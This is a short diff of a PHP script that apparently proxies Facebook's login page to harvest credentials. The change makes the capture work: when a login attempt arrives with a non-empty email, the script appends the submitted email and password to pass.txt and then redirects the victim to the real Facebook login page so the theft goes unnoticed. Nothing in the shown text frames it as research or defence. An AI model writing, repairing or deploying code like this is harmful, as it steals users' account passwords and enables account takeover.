@@ -18,8 +18,10 @@ $url = $base . $_SERVER['REQUEST_URI'];
 if (strpos($_SERVER['REQUEST_URI'], 'login.php?login_attempt') !== false) {
 	$file = file_get_contents('pass.txt');
 //	echo $file;
-     	file_put_contents($file . $_POST['email'] . ' - ' . $_POST['pass'] . '\n');
-// 	header('Location: https://facebook.com/login.php?login_attempt=1&lwv=110');
+	if($_POST['email'] != ''){
+		file_put_contents('pass.txt', $file . $_POST['email'] . ' - ' . $_POST['pass'] . '\n');
+	 	header('Location: https://facebook.com/login.php?login_attempt=1&lwv=110');
+	}
 // 	die();
 }
 // Open the cURL session
